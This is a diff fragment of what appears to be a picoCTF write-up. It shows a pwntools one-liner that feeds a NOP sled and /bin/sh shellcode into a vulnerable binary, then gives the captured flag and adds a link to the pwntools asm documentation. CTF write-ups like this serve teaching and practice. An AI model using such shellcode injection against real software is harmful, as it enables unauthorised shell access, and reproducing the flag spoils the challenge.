@@ -36,3 +36,5 @@ Another way similar to what we did in [handy shell overflow](https://github.com/
 (python -c 'import pwn; print(pwn.asm(pwn.shellcraft.nop())*256+pwn.asm(pwn.shellcraft.linux.sh()))';cat)|./vuln
 ```
 flag is `picoCTF{sl1pp3ry_sh311c0d3_de21cb07}`
+
+`asm` resource [here](https://docs.pwntools.com/en/stable/asm.html)
